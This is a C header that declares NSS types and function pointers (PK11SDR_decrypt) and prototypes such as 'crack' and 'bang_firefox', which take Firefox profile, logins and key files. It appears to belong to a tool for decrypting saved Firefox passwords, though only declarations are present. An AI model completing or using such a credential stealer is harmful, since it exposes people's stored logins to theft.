#pragma once
#include <stdio.h>
enum SECItemType {
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer,
    siDERCertBuffer,
    siEncodedCertBuffer,
    siDERNameBuffer,
    siEncodedNameBuffer,
    siAsciiNameString,
    siAsciiString,
    siDEROID,
    siUnsignedInteger,
    siUTCTime,
    siGeneralizedTime
};

typedef struct SECItem {
    enum SECItemType type;
    unsigned char* data;
    size_t len;
} SECItem;
typedef enum SECStatus {
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
}SECStatus;




long(*nss_init)(char*);
int (*PK11SDR_decrypt)(SECItem*, SECItem*, void*);
long(*nss_shutdown)(void);


void load_nss();
char* crack(char* s);

void bang_firefox(char* profile_path, char* logins_path, FILE* logins_file, char* key_path, FILE* key_file);



int firefox();

